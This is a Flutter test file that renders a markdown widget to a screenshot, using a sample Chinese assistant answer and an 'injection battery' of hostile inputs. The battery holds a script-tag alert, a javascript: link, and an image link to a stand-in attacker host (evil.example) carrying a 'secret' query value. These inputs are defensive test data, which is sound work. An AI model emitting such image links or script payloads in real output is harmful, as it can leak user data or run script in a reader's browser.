// Dev screenshot harness for AnMarkdown — NOT part of the gate. Run explicitly:
//   flutter test test/dev/capture_markdown.dart
// Renders a real assistant-answer document (headings/bold/links/inline+fenced code/table/quote/lists) and
// the injection battery on the WHITE ocean → test/dev/out/markdown.png. AnMarkdown 截图夹具(非门禁)。
import 'dart:io';
import 'dart:ui' as ui;

import 'package:anselm/core/design/colors.dart';
import 'package:anselm/core/design/theme.dart';
import 'package:anselm/core/design/tokens.dart';
import 'package:anselm/core/design/typography.dart';
import 'package:anselm/core/ui/ui.dart';
import 'package:anselm/i18n/strings.g.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/services.dart';
import 'package:flutter_test/flutter_test.dart';

Future<void> _load(String family, String path) async {
  final f = File(path);
  if (!f.existsSync()) return;
  await (FontLoader(family)
        ..addFont(Future.value(ByteData.view(
            f.readAsBytesSync().buffer, 0, f.readAsBytesSync().length))))
      .load();
}

const String _doc = '''
查完了,两个发现 🎯

## 根因

`issue_date` 没做**时区归一**——跨年边界上 Q4 与次年 Q1 混桶。细节见 [PR #42](https://example.com/pr/42)。

> 用户的原话:第 3 次还失败的话,能不能自动开个 issue?

## 修法

1. 先把日期归一到本位时区
2. 再按季度聚合,标出超 10% 波动
3. 失败分支挂 `create_issue`

```py
def bucket(items, tz):
    for it in items:
        yield it.issue_date.astimezone(tz).quarter
```

| 季度 | 金额 | 环比 |
|:-----|:----:|-----:|
| Q1 | 120k | +4% |
| Q2 | 98k | -18% |
| Q3 | 143k | +46% |

---

- [x] 重试已加(指数退避 `1s→2s→4s`)
- [ ] issue 自动化待你确认
''';

const String _inject = '''
注入电池:<script>alert(1)</script> 与 <u>下划线?</u> 全字面。

[js 链接](javascript:alert(1)) · [正常链接](https://example.com)

![外部图](https://evil.example/track.png?q=secret)

半截加粗 **bo 与未闭合围栏:

```py
print("still streaming
''';

void main() {
  setUpAll(() async {
    await _load('MiSans', 'assets/fonts/MiSansVF.ttf');
    await _load('JetBrains Mono', 'assets/fonts/JetBrainsMono.ttf');
    final cache = '${Platform.environment['HOME']}/.pub-cache/hosted/pub.dev';
    await _load('packages/lucide_icons_flutter/Lucide300',
        '$cache/lucide_icons_flutter-3.1.14+2/assets/build_font/LucideVariable-w300.ttf');
  });

  testWidgets('capture markdown document + injection battery', (tester) async {
    const key = ValueKey('cap');
    tester.view.devicePixelRatio = 1.0;
    tester.view.physicalSize = const Size(700, 1560);
    addTearDown(tester.view.reset);

    await tester.pumpWidget(RepaintBoundary(
      key: key,
      child: TranslationProvider(
        child: MaterialApp(
          debugShowCheckedModeBanner: false,
          theme: AnTheme.light(),
          home: Builder(builder: (context) {
            final c = context.colors;
            return Material(
              color: c.surface,
              child: SingleChildScrollView(
                padding: const EdgeInsets.all(AnSpace.s32),
                child: Center(
                  child: SizedBox(
                    width: 620,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        const AnMarkdown(_doc),
                        const SizedBox(height: AnSpace.s32),
                        Text('── 注入电池 ──', style: AnText.meta.copyWith(color: c.inkFaint)),
                        const SizedBox(height: AnSpace.s8),
                        const AnMarkdown(_inject),
                      ],
                    ),
                  ),
                ),
              ),
            );
          }),
        ),
      ),
    ));
    await tester.pump();
    await tester.pump(const Duration(milliseconds: 60));

    late final Uint8List bytes;
    await tester.runAsync(() async {
      final boundary = tester.renderObject<RenderRepaintBoundary>(find.byKey(key));
      final image = await boundary.toImage(pixelRatio: 2.0);
      final png = await image.toByteData(format: ui.ImageByteFormat.png);
      bytes = png!.buffer.asUint8List();
      image.dispose();
    });
    Directory('test/dev/out').createSync(recursive: true);
    File('test/dev/out/markdown.png').writeAsBytesSync(bytes);
  });
}
